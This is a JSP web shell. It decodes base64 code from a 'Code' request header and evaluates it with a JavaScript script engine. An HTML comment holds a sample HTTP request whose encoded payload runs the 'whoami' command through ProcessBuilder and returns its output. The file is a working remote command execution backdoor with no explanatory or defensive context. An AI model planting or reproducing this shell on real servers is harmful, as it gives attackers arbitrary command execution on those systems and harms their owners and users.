<%
    javax.script.ScriptEngine Engine = new javax.script.ScriptEngineManager().getEngineByExtension("js");
    Engine.eval(new String(new sun.misc.BASE64Decoder().decodeBuffer(request.getHeader("Code"))));
    response.getWriter().println(Engine.get("result"));
%>
<!-- 

GET /test/script-engine.jsp HTTP/1.1
Host: 127.0.0.1:9090
Code: dmFyIHJlc3VsdCA9ICIiOw0KdmFyIFByb2Nlc3NCdWlsZGVyID0gSmF2YS50eXBlKCJqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIiKTsNCnZhciBTY2FubmVyID0gSmF2YS50eXBlKCJqYXZhLnV0aWwuU2Nhbm5lciIpOw0KdmFyIHNjYW5uZXIgPSBuZXcgU2Nhbm5lcihuZXcgUHJvY2Vzc0J1aWxkZXIoWyJ3aG9hbWkiXSkuc3RhcnQoKS5nZXRJbnB1dFN0cmVhbSgpKS51c2VEZWxpbWl0ZXIoIlxcQSIpOw0KcmVzdWx0ID0gc2Nhbm5lci5oYXNOZXh0KCkgPyBzY2FubmVyLm5leHQoKSA6IiI7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

-->